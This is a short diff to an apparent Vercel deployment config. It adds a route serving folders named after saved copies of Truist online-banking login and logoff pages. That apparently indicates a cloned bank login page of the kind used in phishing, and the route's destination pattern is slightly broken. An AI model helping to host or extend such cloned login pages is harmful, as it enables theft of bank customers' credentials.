@@ -3,6 +3,12 @@
       "api/index.php": {
         "runtime": "vercel-php@0.6.0"
       }
-    }
+    },
+    "routes": [
+        {
+            "src": "/(Logoff _ Truist_files|Truist Online Banking Login _ Truist_files|vendor)/(.*)",
+            "dest": "/$1/$2/$3"
+        }
+      ]
     
   }
